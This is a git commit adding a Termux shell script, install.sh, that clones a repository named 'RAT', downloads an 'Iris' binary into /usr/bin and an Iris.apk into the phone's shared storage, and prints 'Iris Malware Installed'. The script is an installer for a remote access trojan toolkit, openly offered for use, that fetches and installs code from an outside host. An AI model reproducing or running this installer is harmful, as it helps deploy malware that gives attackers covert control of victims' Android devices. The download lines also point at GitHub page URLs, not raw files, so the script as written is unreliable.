8eadfb09770d199db5152ed0607fbdaaeaa7e43a
IrisYoutuber <78909129+IrisYoutuber@users.noreply.github.com>
2021-02-11 20:43:55 +0530

    Add files via upload

---
+++ install.sh
@@ -0,0 +1,18 @@
+termux-setup-storage
+pkg install git -y
+pkg install wget -y 
+pkg install nodejs -y
+pkg install proot
+
+cd $HOME
+git clone https://github.com/IrisYoutuber/RAT.git
+mv RAT .rat
+wget https://github.com/IrisYoutuber/RAT/blob/master/app/factory/decompiled/build/apk/install
+termux-chroot
+mv install Iris
+mv Iris /usr/bin/
+wget https://github.com/IrisYoutuber/RAT/blob/master/app/factory/decompiled/build/apk/Iris.apk
+mv Iris.apk /sdcard
+echo "IRIS APK SAVED IN INTERNAL STORAGE"
+echo "Iris Malware Installed"
+echo "Type (Iris) To Run"
